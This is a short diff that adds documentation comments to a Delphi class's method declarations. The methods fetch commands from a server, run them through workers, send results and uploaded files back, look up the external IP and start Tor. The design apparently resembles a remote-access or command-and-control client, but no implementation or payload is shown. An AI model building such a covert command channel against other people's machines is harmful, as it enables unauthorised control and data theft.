@@ -26,14 +26,23 @@ type
   private
     { Private declarations }
   public
+    ///  <summary>Attempts to download a file from the given URL and save it as FileName</summary>
     function DownloadFile(URL, FileName: String): Boolean;
+    ///  <summary>Downloads the list of commands from the server</summary>
     procedure GetCommands;
+    ///  <summary>Parses the list of commands and assigns Workers to the new ones</summary>
     procedure ParseCommands;
+    ///  <summary>Sends the response to a specific command as a TStringList</summary>
+    ///  <param name="ID">Identifier of the given command</param>
+    ///  <param name="Last">If true, the command will be marked as completed and deleted from the list</param>
     procedure SendResponse(R: TStringList; ID: Int64;
       Last: Boolean = True); overload;
+    ///  <summary>Sends the response to a specific command as a simple String</summary>
     procedure SendResponse(S: String; ID: Int64; Last: Boolean = True);
       overload;
+    ///  <summary>Uploads a file to the server as a response to a command</summary>
     procedure SendFile(FileName: String; ID: Int64);
+    ///  <summary>Attempts to get the external IP Address</summary>
     function GetIP: String;
     procedure RunTor;
   end;
